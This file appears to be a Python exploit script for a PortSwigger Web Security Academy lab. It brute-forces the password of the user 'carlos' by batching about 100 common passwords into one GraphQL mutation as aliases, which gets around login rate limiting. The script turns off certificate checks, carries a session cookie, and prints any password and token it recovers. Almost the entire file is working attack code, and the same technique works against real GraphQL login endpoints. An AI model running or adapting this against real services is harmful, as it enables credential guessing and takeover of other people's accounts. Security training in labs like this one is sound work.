#!/usr/bin/env python3
import requests
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = "https://0a39006e04e0d878824a078f00fe0031.web-security-academy.net/graphql/v1"
SESSION = "MmmQvBWbLIfmPxRaA3PwzIuq9Y9HZ7pH"

headers = {
    "Cookie": f"session={SESSION}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
}

passwords = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234",
    "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football",
    "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321",
    "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx",
    "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1",
    "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer",
    "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars",
    "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper",
    "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777",
    "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua",
    "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea",
    "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin",
    "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring",
    "montana", "moon", "moscow"
]

# Build the GraphQL query with aliases for each password
print("[*] Building GraphQL query with password aliases...")

# Create aliases for each password
aliases = []
for i, password in enumerate(passwords):
    # Use valid GraphQL alias names (replace special chars)
    alias = f"alias{i}"
    aliases.append(f'{alias}: login(input: {{username: "carlos", password: "{password}"}}) {{ token success }}')

# Construct the full mutation
query = "mutation { " + " ".join(aliases) + " }"

payload = {
    "query": query
}

print(f"[*] Testing {len(passwords)} passwords in a single request...")
print(f"[*] Query length: {len(query)} characters\n")

response = requests.post(TARGET, headers=headers, json=payload, verify=False)

if response.status_code == 200:
    data = response.json()

    # Check if we got data back
    if 'data' in data:
        print("[+] Response received! Checking for successful login...\n")

        # Check each alias for success
        for i, password in enumerate(passwords):
            alias = f"alias{i}"
            result = data['data'].get(alias)

            if result and result.get('success'):
                print(f"🎯🎯🎯 SUCCESS! Password found: {password}")
                print(f"Token: {result.get('token')}")
                print(f"\nCarlos credentials: carlos:{password}")
                break
        else:
            print("[-] No successful login found in aliases")
            # Show first few results
            print("\nSample results:")
            for i in range(min(3, len(passwords))):
                alias = f"alias{i}"
                print(f"{alias} ({passwords[i]}): {data['data'].get(alias)}")

    elif 'errors' in data:
        print("[-] GraphQL errors:")
        print(json.dumps(data['errors'], indent=2))
    else:
        print("[-] Unexpected response format")
        print(response.text[:500])
else:
    print(f"[-] Request failed: {response.status_code}")
    print(response.text[:500])
